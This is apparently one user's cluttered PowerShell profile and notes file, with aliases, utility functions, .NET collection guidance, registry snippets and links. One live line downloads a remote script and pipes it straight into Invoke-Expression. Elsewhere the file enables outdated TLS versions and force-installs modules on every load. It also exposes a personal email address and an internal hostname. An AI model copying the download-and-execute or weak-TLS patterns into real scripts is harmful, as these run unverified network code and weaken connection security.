# C:\Users\Herb\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
# https://keepass.info
# https://keepass.info/plugins.html
# https://github.com/kee-org/keepassrpc/releases/tag/v1.7.3.1
# http://winmerge.org/
# https://sourceforge.net/projects/winmerge/files/alpha/2.15.2/WinMerge-2.15.2-x64-Setup.exe/download

#https://sqldbawithabeard.com/2018/03/11/easily-splatting-powershell-with-vs-code/
#https://insights.stackoverflow.com/survey/2018/
#https://seeminglyscience.github.io/powershell/2017/09/30/invocation-operators-states-and-scopes
#https://sourceforge.net/projects/winmerge/files/alpha/2.15.2/
# Trevor SplatHelper
# https://kevinmarquette.github.io/2017-02-19-Powershell-custom-attribute-validator-transform/
# https://learn-powershell.net/2010/09/11/scanning-ports-on-multiple-hosts/
# https://gallery.technet.microsoft.com/ScriptCenter/97119ed6-6fb2-446d-98d8-32d823867131/
# https://docs.microsoft.com/en-us/powershell/scripting/core-powershell/vscode/using-vscode?view=powershell-6#debugging-with-visual-studio-code
# 
# 
#Desktop site: https://www.regular-expressions.info/?id=113400&email=HerbMartin@Gmail.com
#Mobile site: https://regular-expressions.mobi/?id=113400&email=HerbMartin@Gmail.com
# Regular-ExpressionsInfo*.pdf

<#
get-psreadlinekeyhandler | ? key -eq unbound
get-psreadlinekeyhandler | ? command -match history
get-psreadlinekeyhandler | ? function -match history
get-psreadlinekeyhandler | ? key -match r\b
Set-PSReadlineKeyHandler 'Alt+r' ViSearchHistoryBackward
get-psreadlinekeyhandler | more
w '$Path:*' |more
foreach ($ext in @("$($env:pathext)" -split ';') ) {w "*$ext" 2>$null >>t.txt } 
cl  @((224..229) + 257,266)
#>

new-alias kp 'C:\Program Files (x86)\KeePass2\KeePass.exe' -force -scope Global
function Group-Error {
  [CmdletBinding()]param(
    [Object[]]$Error=$Error,
    [int]$First=9999, 
    [int]$Last=20
  )
  $error | select -first $First | group | sort count | select count, name -Last $Last
}

install-module SnippetPX,HistoryPX,FormatPx,DebugPx,TypePx -force -allowclobber
$vlcPath = join-path 'C:\Program*\V*','T:\Program*\V*' 'vlc.exe' -resolve -ea 0 2>$Null | 
           select -first 1 | % { new-alias v $_ -force -scope Global -ea 0 }

# Background Intelligent Transfer Service
# Get date-time formatString  https://docs.microsoft.com/en-us/dotnet/standard/base-types/standard-date-and-time-format-strings
# Get string format
# Get regex 
# Build Help addendum
# C:\Program Files\WinMerge\WinMergeU.exe'
# https://sourceforge.net/projects/winmerge/files/alpha/2.15.2/WinMerge-2.15.2-x64-Setup.exe/download

#requires -Module Reflection
function Find-Dependencies {
    param($Path)
    Get-ParseResults $Path | 
        Find-Token { $_ -is "System.Management.Automation.Language.CommandAst" } | 
        Get-Command -Name { $_.CommandElements[0].Value } -ea continue | # Errors will appear for commands you don't have available
        Sort Source, Name | 
        Group Source |
        Select @{N="Module";e={$_.Name}}, @{N="Used Commands";E={$_.Group}}
}

Video Debugging 
https://github.com/KirkMunro
Version   Name      Repository Description                                                                             
-------   ----      ---------- -----------                                                                             
1.0.5.18  SnippetPx PSGallery  The SnippetPx module enhances the snippet experience in PowerShell by offering a new ...
1.0.6.15  HistoryPx PSGallery  HistoryPx uses proxy commands to add extended history information to PowerShell. This...
1.1.3.15  FormatPx  PSGallery  FormatPx separates the formatting layer from the data processing layer in PowerShell....
1.0.3.14  DebugPx   PSGallery  The DebugPx module provides a set of commands that make it easier to debug PowerShell...
2.0.1.20  TypePx    PSGallery  The TypePx module adds properties and methods to the most commonly used types to make...
1.0.17.60 ScsmPx    PSGallery  The ScsmPx module facilitates automation with Microsoft System Center Service Manager...
1.0.0.8   DoPx      PSGallery  The DoPx module provides a rich set of commands that extend the automation capabiliti...
0.3       MrAAppx   PSGallery  Custom Functions for working with Appx.                                                 
1.0.8.10  LodPx     PSGallery  Automation library for the OneLearn Lab on Demand platform                              




"C:\Program Files (x86)\Microsoft VS Code\Code.exe"

The Organized Mind: Thinking Straight in the Age of Information Overload
Resylio Sync
Anki
code -d fileold filenew
https://github.com/ShareX/ShareX/releases/tag/v12.0.0

http://sp.ntpcug.org/PowerShell/Shared%20Documents/Larry_Weiss_PS_cheatsheet.doc.doc
http://sp.ntpcug.org/PowerShell/Shared%20Documents/Larry_Weiss_PS_strings_cheatsheet.doc.doc


$Events = Get-EventLog -LogName "system" -Newest 1000
#$Events | Group-Object -Property eventID
$Events | Group-Object -Property eventID |sort count

https://github.com/vimwiki/vimwiki

Fred:
Templates
(A component of the `PSModuleDevelopment` powershell module)
Specifically, a simple way to create, manage and use templates (not restricted to PowerShell - it can template anything plaintext and carry along other files).
Official announcement:
https://allthingspowershell.blogspot.com/2018/03/announcing-simple-templates-latest.html
Short video on creating and using a template in less than 5 minutes:
https://youtu.be/8WkHaH20OEE
Documentation Root:
http://psframework.org/documentation/documents/psmoduledevelopment/templates.html (edited)
YouTubePSFramework https://youtu.be/8WkHaH20OEE
PSModuleDevelopment Templates Tutorial 1 - File
# Deal with TLS requirements for download from web sites

OneNote work for you
https://www.youtube.com/watch?v=v7PYPl5WSVA

<#
# Collection Type Guidence
## When to use what
* Use Arrays if you know the element types and have a fixed length and/or known-up-front collection size that will not change.
* Use ArrayList if you have an unkown collection size with either unknown or mixed type elements.
* Use a Generic List<t> when know the type of the elements but not the size of the collection. 
* Use a HashTable if you are going to do key based lookups on a collection and don't know the object type of the elements. 
* Use a Dictionary<TKey, TValue> you are going to do key based lookups on a collection and you know the type of the elements. 
* Use a HashSet<t> when you know the type of elements and just want unique values and quick lookups and assignmnets.
* Use LinkList<t> if you are going to make large numbers of additions and subtractions to an ordered list (and have the understanding to use this type)
* Use Queue<t> if you will build a collection that will need to be worked on First-in-first-out FIFO
* Use Stack<t> if you will build a collection that will need to be worked Last-in-first-out LIFO
* Use SortedSet<T> when you need a HasSet<t> like set, but sorted (alaphbetically, for example)
* Use SortedList<t> when you need a List<t>, but sorted (alaphbetically, for example)
* Use SortedDictionary<TKey, TValue> when you need a Dictionary<TKey, TValue>, but sorted (alaphbetically, for example)
## Avoid the following:
* Do not use Object[]
* Do not use += on Arrays. If your collection will grow or shrink, use ArrayList or List<t>
* Do not use List<Object> for value types (int32, int64, char, etc)
* avoid using Arrays, Lists, and ArrayLists for lookup/search operations, use ditcionaries and sets instead
* Linked lists should only be considered in rediculously high volume add/remove operations to a list as the code complexity is too much for PowerShell
* Only use "sorted" types when you really need to. If you only need it for reconstituion, sorting the keys and then foreaching them can work on small collections
## Examples
### Arrays
https://docs.microsoft.com/en-us/dotnet/api/system.array?view=netframework-4.7.1
string array:
```powershell
$Array = [string[]]@('string1','string2')
```
Int array:
```powershell
$Array = [int[]]@(1,2,3,4,5)
```
### ArrayList
https://docs.microsoft.com/en-us/dotnet/api/system.collections.arraylist?view=netframework-4.7.1
```powershell
$ArrayList = [System.Collections.ArrayList]::new()
$null = $ArrayList.Add(1)
$null = $ArrayList.Add('String1')
```
### List<t>
https://docs.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1?view=netframework-4.7.1
String:
```powershell
$List = [System.Collections.Generic.List[String]]::new()
$List.Add('String1')
$List.Add('String2')
```
Int:
```powershell
$List = [System.Collections.Generic.List[Int]]::new()
$List.Add(1)
$List.Add(2)
```
### Hashtable
https://docs.microsoft.com/en-us/dotnet/api/system.collections.hashtable?view=netframework-4.7.1
```powershell
$HashTable = @{
    Key1 = "Value1"
    Key2 = "Value2"
}
```
### Dictionary
https://docs.microsoft.com/en-us/dotnet/api/system.collections.generic.dictionary-2?view=netframework-4.7.1
Case Sensitive (default)
```powershell
$Dictionary = [System.Collections.Generic.Dictionary[String,String]]::New()
$Dictionary['key1'] = 'Value1'
$Dictionary['key2'] = 'Value2'
# Is case sensitiveby default:
$Dictionary['Key2'] = 'Value3'
```
Case Insensitive:
```powershell
$Comparer = [System.StringComparer]::InvariantCultureIgnoreCase
$Dictionary = [System.Collections.Generic.Dictionary[String,String]]::New($Comparer)
$Dictionary['key1'] = 'Value1'
$Dictionary['key2'] = 'Value2'
# Will repllace the key above
$Dictionary['Key2'] = 'Value3'
```
Example using processes and looking them up by PID:
```powershell
$ProcessDict = [System.Collections.Generic.Dictionary[int,System.Diagnostics.Process]]::new()
Get-Process | ForEach-Object {
    $ProcessDict[$_.Id] = $_
}
$ProcessDict[0] | format-list *
```
#>

[Net.ServicePointManager]::SecurityProtocol = 
  [Net.SecurityProtocolType]::Tls12 -bor `
  [Net.SecurityProtocolType]::Tls11 -bor `
  [Net.SecurityProtocolType]::Tls
# Or since this is PowerShell, you can let it parse a string for you:
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"

<#
https://github.com/ChrisLGardner/PowershellScripts/blob/master/Get-LoginSuccess.ps1

Defrag Tools: #1 - Building your USB thumbdrive
Defrag Tools: #2 - Process Explorer
Defrag Tools: #3 - Process Monitor
Defrag Tools: #4 - Process Monitor - Examples
Defrag Tools: #5 - Autoruns and MSConfig
Defrag Tools: #6 - RAMMap
Defrag Tools: #7 - VMMap
Defrag Tools: #8 - Mark Russinovich
Defrag Tools: #9 - ProcDump
Defrag Tools: #10 - ProcDump - Triggers
Defrag Tools: #11 - ProcDump - Windows 8 & Process Monitor
Defrag Tools: #12 - TaskMgr and ResMon

### Fix getsession -> Get-WinStaSession
### Function Get-Session { param([string]$UserName=($env:UserName), [Alias('All','Users')][switch]$AllUsers,[switch]$AllSessions ) $sessions = (qwinsta | select -skip 1 );  ($sessions -match '^([>\s]' |select -first 1) -split '\s+' | [pscustomerobject]@{  } } 

# DOTNET .NET collection objects 
$hashset = [System.Collections.Generic.HashSet[string]]::new()
$hashset.gettype()
$hashset = @{}
$hash.gettype()
$hashset = [System.Collections.Generic.HashSet[string]]::new()
$hash.gettype()
$hashset = @{}
$hashset = [System.Collections.Generic.HashSet[string]]::new()
$hashset.gettype()
$hash = @{}
$hash.gettype()
$hashord = [ordered]@{}
$hashord.gettype()
$ListString = [System.Collections.Generic.List[string]]::new()
$ListString.gettype()
$ListString.Add(1)
$ListString

$SortedSet = [System.Collections.Generic.SortedSet[String]]::new([System.StringComparer]::InvariantCultureIgnoreCase)
mayb difference between a hasset and a hash table is the complete lack of values in a hashset
it's just keys
it's like an array or list of unique items
and it's always unique.. when you try to add one that already exists nothing happens
it's super fast to add to because it stores those keys in the same kind of bucket sturcture that hashtables keys use for fast lookups (edited)
if you have pluralsight... there are several C# lessions on the generic types, how they work, and when to use them.. and it doesn't really require a deep understanding of C#... if you know powershell decent enough, the videos will make sense as the examples are simple and the syntax for them is close enough to powershell

$ListString | %{$_.gettype()}
$ListInt = [System.Collections.Generic.List[int]]::new()
$ListInt.Add("happy")
$ListInt.Add(1)
$ListObject = [System.Collections.Generic.List[System.Object]]::new()
$ListObject.Add(1)
$ListObject.Add("string value" )
$ListObject
$ListObject | ? { $_.gettype() }


# so if you want to use the hashset.. fasted was is to just use the add method
$hashset = [System.Collections.Generic.HashSet[string]]::new()

# Naive find functions defined in file:
(get-content .\Microsoft.PowerShell_profile.ps1) | ? { $_ -match '^\s*(function\s+([^|{])*)'} | % { $Matches[1]} | sort -uniq | measure 

Subst K: C:\\Users\\A469526\\documents\\tools
https://code.google.com/p/psubst/#Inconstancy

gal | ? ReferencedCommand -match 'childitem'
(new-object Net.WebClient).DownloadString("http://psget.net/GetPsGet.ps1") | iex
set-psreadlinekeyhandler -Function *history*

jdhitsolutions/Optimize-PSReadLineHistory    https://gist.github.com/jdhitsolutions/841fcd6f0318f9f51d2e05873ba658a4
rkeithhill/Optimize-PSReadlineHistory.ps1 ** https://gist.github.com/rkeithhill/4099bfd8420eed0e6dbc

https://codegists.com/language/windows-powershell/
http://blog.powershell.no/2010/06/02/dynamic-remote-desktop-connection-manager-connection-list 

REGEDIT4
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices] 
"Z:"="\\??\\C:\\Documents\\All Users\\Tools"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"K Drive"="subst K: C:\\Users\\A469526\\documents\\tools
"L Drive"="subst L: G:\\Tools"
"M Drive"="subst M: F:\\Tools"

TRUE PowerShell command history persistence 
http://orsontyrell.blogspot.com/2013/11/true-powershell-command-history.html
  Redirect your default profile to your tricked-out profile.
  http://orsontyrell.blogspot.com/2013/11/saurons-powershell-profile-in-3-easy.html

  Since you're putting your command history and profile on dropbox, don't forget to add your modules as well!

  Setup a command line installer like Scoop or Chocolatey.
  https://github.com/lukesampson/scoop/
  http://chocolatey.org/

  With one of these installer you're one line away from all sorts of cool tools, stuff like:  7zip, curl, grep, nano, git, openssh, vim, wget.  With Chocolately you can install goodies like Notepad++, Chrome, VLC, etc.


  bunch of sources:
  http://psget.net/
  https://github.com/lzybkr/PSReadLine
  http://stackoverflow.com/questions/17862618/loading-powershell-history
  http://blog.clintarmstrong.net/2011/05/powershell-history-persistence.html
  http://rkeithhill.wordpress.com/2013/10/18/psreadline-a-better-line-editing-experience-for-the-powershell-console/
#>


function Get-LastCommand {
  param([uint16]$count=1, [switch]$All, [string]$filter='*')
	If ($All) { $count = 30KB }
	##dir *log.txt -rec | % {$cname = $_.fullname; $_} | gc | ? {$_ -match '""Exception'} | % {"$cname $_"}
	(h).commandline | select -last $count | ? { $_ -like $filter}
}
Get-TroubleshootingPack -Path C:\Windows\Diagnostics\System\Aero
https://blogs.technet.microsoft.com/heyscriptingguy/2011/02/09/use-powershell-troubleshooting-packs-to-diagnose-remote-problems/
https://blogs.msdn.microsoft.com/commandline/2017/06/20/understanding-windows-console-host-settings/
Console ColorTool https://github.com/Microsoft/console/tree/master/tools/ColorTool
iTerm Themes      https://github.com/mbadolato/iTerm2-Color-Schemes

# https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/FreeRDP-User-Manual.markdown
# https://ci.freerdp.com/job/freerdp-nightly-windows/arch=win64,label=vs2013/lastSuccessfulBuild/artifact/build/Release/wfreerdp.exe
 <#  Windows Console Host Regisry Settings 
  1.Hardcoded settings in conhostv2.dll
  2.User's configured Console defaults, stored as values in 'HKCU\Console'
  3.Per-Console-application registry settings, stored as sub-keys of 'HKCU:\Console\<sub-key>' 
    using one of two sub-key names: ◦Console application path (replacing '\' with '_')  ◦Console title
  4.Windows shortcut (.lnk) files

(Get-ItemProperty -literal  HKCU:\Console)   # defaults  
(gci HKCU:\Console\).name                    # names for apps path or windows title

$ConsoleColors | % { $colorLeft = $_; $ConsoleColors | % {write-host ('{0,14} on {1,-14}' -f $ColorLeft,$_* 3) -fore $colorLeft -back $_} ; write-host "`n`n" -back black } | more
$ConsoleColors = 'Black', 'Blue', 'Cyan', 'DarkBlue', 'DarkCyan', 'DarkGray', 'DarkGreen', 'DarkMagenta', 'DarkRed', 'DarkYellow', 'Gray', 'Green', 'Magenta', 'Red', 'White', 'Yellow'
$ConsoleColors | % { write-host (('{0,16}' -f $_ ) * 4) -back black -fore $_; write-host $(( '{0,16}' -f $_ ) * 4) -back white -fore $_ }

# Select-Xml -Path C:\Windows\System32\WindowsPowerShell\v1.0\types.ps1xml -XPath "Types/Type/Name" | Select-Object -ExpandProperty Node
# find-module psscripttools |install-module -force -allowclo
# install-module pstypeextensiontools 

New NotePad++ Version
<li class="first"><a href="news/notepad-7.5.5-released.html">Notepad++ 7.5.5 released</a>

'C:\dev\EncodingDetector\src\Example\bin\Debug'
Character Encoding Detection dir \dev\*.ps1 |% {write-host ('{0,30}  ' -f $_.name) -NoNewline; .\udetect.exe $_.fullname }

# from https://gist.github.com/zommarin/1480974
function Get-FileEncoding($Path) {
    $bytes = [byte[]](Get-Content $Path -Encoding byte -ReadCount 4 -TotalCount 4)
    if(!$bytes) { return 'utf8' }
    switch -regex ('{0:x2}{1:x2}{2:x2}{3:x2}' -f $bytes[0],$bytes[1],$bytes[2],$bytes[3]) {
        '^efbbbf'   { return 'utf8' }
        '^2b2f76'   { return 'utf7' }
        '^fffe'     { return 'unicode' }
        '^feff'     { return 'bigendianunicode' }
        '^0000feff' { return 'utf32' }
        default     { return 'ascii' }
    }
}

function Get-Numbers {
  [CmdletBinding(SupportsPaging = $true)]param()
  begin { 
    write-verbose "Begin..."
    $FirstNumber = [Math]::Min($PSCmdlet.PagingParameters.Skip, 100)
    $LastNumber  = [Math]::Min($PSCmdlet.PagingParameters.First +
      $FirstNumber - 1, 100)
    $pscmdLet | gm
    $pscmdLet.WriteCommandDetail("--This is a test--")
    if ($PSCmdlet.PagingParameters.IncludeTotalCount) {
        $TotalCountAccuracy = 1.0
        $TotalCount = $PSCmdlet.PagingParameters.NewTotalCount(100,
          $TotalCountAccuracy)
        Write-Output $TotalCount
    }
  }  
  process {    
    $FirstNumber .. $LastNumber | Write-Output
  }
  end { write-verbose "Ending."}  
}


function NoCmdletBinding {    # No CmdLetBinding()
  param()
  write-verbose "NoCmdletBinding"
}
function CmdletBinding {
  [CmdletBinding()]param()
  write-verbose "CmdletBinding"
}
function NoParam {            # No CmdLetBinding() No Param  
  write-verbose "NoParam"
}

dir ~\Documents\WindowsPowershell -File | 
    select Name,@{Name='Encoding';Expression={Get-FileEncoding $_.FullName}} | 
    ft -AutoSize
 

New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT

#>

# Custom Objects Don Jones https://technet.microsoft.com/en-us/library/hh750381.aspx
<#
. ([scriptblock]::Create($((Get-Clipboard) -join "`n")))


gc C:\bat\Macros.txt | 
  % { if ($_ -match '([^=\s]+)=(.+)') { 
  	  ($macro, $expansion) = ($matches[1], $matches[2])
			$expansion = $expansion -creplace '\B\$T\B', '&' 
			$expansion = $expansion -creplace '\$([\d])', '$args[$1]' 
			$expansion = $expansion -creplace '([^)]+[)])', '$1 --%' 
			$expansion = $expansion -creplace '\$\*', '$($args -join '' '') '       # --% ' 
#			if ($expansion -match '(.*)\$\*(.*)') {$expansion = "$($matches[1])" + ($args -join ' ') + ' --% ' + "$($matches[2])"}
      if ($expansion -match '[{}`''"><]') { $CloseBrace = "`n}"} else { $CloseBrace = '}' } 
		  "function tm_$macro { & 'cmd.exe' /c $expansion $CloseBrace"
		}
  }
	
#	Temp-replace args and &  ==ARGSn==  ==ARGS*==
#	Escape special chars
#	Re-replace args


#>
# [enum]::getvalues([system.environment+specialfolder]) | foreach {"$_ maps to " + [system.Environment]::GetFolderPath($_)}

# while($true){cls;netstat -bantp tcp;sleep 5}
# Get-WmiObject -Namespace root\cimv2 -ComputerName . -Query "SELECT * from Win32_LogicalDisk WHERE FileSystem='NTFS' AND Description = 'Local Fixed Disk'"
# $env:path -split ';' | where {!(Test-Path $_  )}
#  ($env:path -split ';' | where {$_ -and (Test-Path $_  )}| select-object -unique
# [System.Environment]::SetEnvironmentVariable('Path',($env:path -split ';' | where {$_ -and (Test-Path $_  )}| select-object -unique) -join ';','Machine')
# [System.Environment]::SetEnvironmentVariable('Path','C:\ProgramData\Oracle\Java\javapath;c:\bat;c:\util;c:\unx\gnu\bin;c:\unx;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\WindowsPowerShell\v1.0\;C:\PerlStrawberry\c\bin;C:\PerlStrawberry\perl\site\bin;C:\PerlStrawberry\perl\bin;C:\Program Files (x86)\Windows Kits\8.1\Windows Performance Toolkit\;C:\Program Files\Microsoft SQL Server\110\Tools\Binn\;C:\ProgramData\chocolatey\bin;C:\Program Files\Microsoft SQL Server\120\Tools\Binn\;C:\Program Files\Microsoft SQL Server\130\Tools\Binn\;C:\Program Files (x86)\nodejs\;C:\Program Files\Git\cmd;C:\Program Files\dotnet\;C:\Users\A469526\.dnx\bin;C:\rakudo\bin;C:\rakudo\share\perl6\site\bin;C:\Users\A469526\.lein\bin;C:\Program Files (x86)\Microsoft VS Code\bin;C:\Users\A469526\AppData\Roaming\npm')
# [System.Environment]::GetEnvironmentVariable('path','user')   'process' 'machine' 
# (new-object System.Net.WebClient).Downloadfile("http://wordpress.org/latest.zip", "C:\Users\Brangle\Desktop\wp-latest.zip")
# (new-object -com SAPI.SpVoice).speak("Hi Carol  it is so good to see you again")                                  
# function glc ([int []]$c=-1) {$c | % {(h)[$_].Commandline} | get-clipboard}
function Get-PreviousCommand([int []]$c=-1) {$c | % {(h)[$_].Commandline}} # + by ID, - by position
#  1..100 | %{ping -n 1 -w 15 11.2.7.$_ | select-string "reply from"}

#dir | ?{$_.LastWriteTime -ge [DateTime]::Today}
# (dir -include *.cs,*.xaml -recurse | select-string .).Count

# start-transcript. Will write session to a text file. 
# Set-PSDebug -Strict 

# Instead of Open-IE I use the built-in ii alias for Invoke-Item
# ii "google.com"; doesn't work. How?
# start http://google.com – orad Aug 10 '15 at 16:26 

# write-host "Your modules are..." -ForegroundColor Red
# Get-module -li

filter FileSizeBelow($size) {if ($_.Length -le $size) { $_ }}
filter FileSizeAbove($size) {if ($_.Length -ge $size) { $_ }}

# $env:path += ";$profiledir\scripts"
# New-PSDrive -Name Scripts -PSProvider FileSystem -Root $profiledir\scripts

function Get-DiskSpace {
	$colItems = Get-wmiObject -class "Win32_LogicalDisk" -namespace "root\CIMV2" -computername localhost
	foreach ($objItem in $colItems) {
		write $objItem.DeviceID $objItem.Description $objItem.FileSystem `
 				 ($objItem.Size / 1GB).ToString("f3") ($objItem.FreeSpace / 1GB).ToString("f3")
	}
}

#[Byte[]]$out=@(); 0..9 | %{$out += Get-Random -Minimum 0 -Maximum 255}; [System.IO.File]::WriteAllBytes("random",$out)

The PowerShell Square Function 

#It's a straight forward pattern to get this working.
#1.Create a function 
#2.Add the param keyword 
#3.Add the [Parameter(ValueFromPipeline)] attribute to the parameter 
#4.Add a Process block for your logic (here, it's just multiplying the parameter by itself) 
#http://www.old.dougfinke.com/blog/index.php/2014/12/23/four-steps-to-turn-powershell-one-liners-into-pipeable-functions/
function sqr {            
	param ([Parameter(ValueFromPipeline)] $p )
	Process { $p * $p }            
}

# NETWORK
# get-wmiobject Win32_NetworkAdapterConfiguration | ? {$_.MacAddress -and $_.ServiceName -notmatch '(^$)|Async|loop'} |select macaddress,description,servicename,ipaddress


Get-Date -Hour 0 -Minute 00 -Second 00              												# Get Midnight for current date
[datetime]::Today                                   												# Another way 
(Get-Date -Hour 0 -Minute 00 -Second 00).AddDays(-7)												# Get Midnight for date a week ago
([datetime]::Today).AddDays(-7)                     												# Or use this 
Get-Date -Month $((Get-Date -Format "MM") - 1) -Hour 0 -Minute 0 -Second 0  # Get Midnight for date a month ago
Get-Date -Year $((Get-Date -Format "yyyy") - 1) -Hour 0 -Minute 0 -Second 0 # Get Midnight for a date one year ago


#get-wmiobject Win32_UserAccount -Filter  "LocalAccount='True'" | ft Name,SID
#get-wmiobject Win32_Group | ft Name,SID
 
function Where-UpdatedSince{   
  Param([DateTime]$date=[DateTime]::Today, [switch]$before=$False)
	Process{ if (($_.LastWriteTime -ge $date) -xor $before) { Write-Output $_ } } 
};  #set-item -path alias:wus -value Where-UpdatedSince

# [ValidateRange(1,10)][int]$xCon = 1; $xCon = 22
# [ValidateLength(1,25)][string]$sCon = ""
# $arr = "aaa","bbb","x"; $OFS='/'; "arr is [$arr]"
# Format output a la printf (see Composite Formatting  http://bit.ly/1gawf5H)
# formatString -f argumentList  https://msdn.microsoft.com/en-us/library/txafckwd.aspx
# $PSItem or $_
# $private:name  $name or $local:name  $script:name  $global:name
# Test-Path variable:name
# --% stop parsing  https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.core/about/about_parsing
# https://www.simple-talk.com/sysadmin/powershell/powershell-one-liners-variables-parameters-properties-and-objects/
#   Get-Member -InputObject object -Name propertyName
#   any |Out-GridView
# https://www.simple-talk.com/sysadmin/powershell/powershell-one-liners-variables-parameters-properties-and-objects/bit.ly/1jFESry
#   any | Select-Object @{Name = name;Expression = scriptBlock}
# $obj | Add-Member -MemberType NoteProperty -Name name -Value value
#   $obj = new-object psobject -property hashtable
#   $obj | Add-Member -NotePropertyMembers hashTable
# $myinvocation.pstypenames # type hierarchy
# "hello" -is [string]  #test type
# [bool]($var -as [int] -is [int])
# [char]integer  [char]0x42
# [bool](gcm Get-ChildItem -ea SilentlyContinue)
# $newObj = $oldObj | Select-Object *  # clone object http://stackoverflow.com/a/9582907/115690
# $PSScriptRoot
#   Split-Path $script:MyInvocation.MyCommand.Path
# Import-Module path\module   Get-Command -Module module Get-Module    Get-Module -ListAvailable
#   Get-Module | Get-Member
# (gcm Get-Verb).ScriptBlock     gc function:Get-Verb     (gci function:Get-Verb).definition
#    & (gmo Test) { Get-Content function:foobar }
# Trace-Command -psHost -Name ParameterBinding { “abc”, “Abc” | select -unique }
#    function foo($a, $b) { Write-Host $PSBoundParameters }; foo “one” “two”
# Param ( [String[]]$files )
#    $IsWP = [System.Management.Automation.WildcardPattern]:: ContainsWildcardCharacters($files)
#     If ($IsWP) { $files = Get-ChildItem $files | % { $_.Name } }   
#     http://stackoverflow.com/a/17334409/115690
# (Get-Command path).FileVersionInfo    (Get-Item path).VersionInfo | Format-List
# Invoke-History integer    r 23 
#  Run command from history by command substring  #commandSubstring   #child (assuming you recently ran e.g. Get-ChildItem);
# $PROFILE | Format-List * -Force 
# Test-Path $PROFILE.CurrentUserCurrentHost
# http://stackoverflow.com/a/21200179/115690
#   $j = Start-Job -ScriptBlock { … } if (Wait-Job $j -Timeout $seconds) { Receive-Job $j } Remove-Job -force $j
# $LastExitCode=0 but $?=False . Redirecting stderr to stdout gives NativeCommandError)
#     http://stackoverflow.com/a/12679208/115690
# any > $null  $null = any  any | Out-Null  [void] (any)
# Invoke-Expression string  iex “write-host hello”  hello
# Get-EventLog -log system –newest 1000 | where-object {$_.eventid –eq '1074'} | format-table machinename, username, timegenerated –autosize 
# Get-Hotfix -id kb2862152
# Backup-GPO –all –path \AdminServerGPO-Backups 
# Get-WMIobject win32_networkadapterconfiguration | where {$_.IPEnabled -eq “True”} | Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | format-Table -Auto 
# Get-WMIobject –computername WS2008-DC01 win32_networkadapterconfiguration | where {$_.IPEnabled -eq “True”}| Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | format-Table –Auto 
# Parse a list of system names and use Get-CIMInstance – a newer CMDlet and faster than Get-WMIObject 
#  Get-CIMInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled = true' -ComputerName (Get-Content C:SERVERLIST.TXT) | Select-Object pscomputername,ipaddress,defaultipgateway,ipsubnet,dnsserversearchorder,winsprimaryserver | Format-Table -AutoSize | out-file c:IPSettings.txt 
# Get-AdDomainController -Filter * | Select hostname,isglobalcatalog | Format-table -auto 
# Get-Content C:userlist.csv | foreach {Get-ADuser $_ | select distinguishedname,samaccountname} | export-csv –path c:newuserlist.csv 
# What is the OS version and Service Pack level for all of my Windows systems in a certain OU? 
#   Get-ADComputer -SearchScope Subtree -SearchBase “OU=PCs,DC=DOMAIN,DC=LAB” –Filter {OperatingSystem -Like “Windows*”} -Property * | Format-Table Name, OperatingSystem, OperatingSystemServicePack 
#    •http://technet.microsoft.com/en-us/library/dn249523.aspx
# gci –r -force | measure -sum PSIsContainer,Length -ea 0
# ghy | select -exp commandline | ogv -outp M | iex
#   Get-History | Select-Object -ExpandProperty commandline | Out-GridView -OutputMode Multiple | Invoke-Expression
# $allusers= ( get-aduser -filter * -properties *)
# $allusers| foreach { set-aduser $_ -displayname ($_.givenname + " " + $_.sn)} 
# Get-Process chrome* | Select-Object processname,ID,CPU | sort CPU
# $ListOfProcessObjects | Where-Object { $_.processname -match "chrome" } | select-object processname,VM | sort VM
# $SystemLogs = Get-EventLog System
# $SystemLogs | Where-Object {$_.entrytype -match "error" } | select-object message,entrytype | sort message | more
# $SystemLogs | Where-Object {$_.entrytype -match "error" } | select-object message| sort message | more | Get-Unique -asstring | more
# Enter-PsSession myserver
# Exit-PsSession
# Invoke-Command -computername myserver1, myserver2, myserver3 {get-Process}
# Invoke-Command -computername myserver1,myserver2,myserver3 -filepath \\scriptserver\c\scripts\script.psl
# $week = (Get-Date).AddDays(-7)
# $domain = (get-addomain).name
# [DateTime]::Now.ToString("yyyyMMdd")     [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")
# $array = "a", "b"; write-output a b c d | select-string -pattern $array -simpleMatch
# (get-addomain).name
# $computer = "."; ([WMICLASS]"\\$computer\root\CIMv2:win32_process").Create("notepad.exe")
# [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Web") ; [System.Web.Security.Membership]::GeneratePassword(10,5)
# if ($variable -is [object]) {}
# [System.net.Dns]::GetHostEntry('APINSSWN08.txdcs.teamibm.com')
# & { trap {continue}; [System.net.Dns]::GetHostAddresses($env:computername) }
# psexec \\machine /s cmd /c "echo. | powershell . get-eventlog -newest 5 -logname application | select message"
# cls;while($true){get-date;$t = New-Object Net.Sockets.TcpClient;try {$t.connect("127.0.0.1",3389);write-host "R...
# cls;$idxA = (get-eventlog -LogName Application -Newest 1).Index;while($true){$idxA2 = (Get-EventLog -LogName Application -newest 1).index;get-eventlog -logname Application -newest ($idxA2 - $idxA) |  sort index;$idxA = $idxA2;sleep 10}


# $p = Read-Host -AsSecureString
# $p | ConvertFrom-SecureString
#$UserName = "yourdomain\username"  #Elevated account name
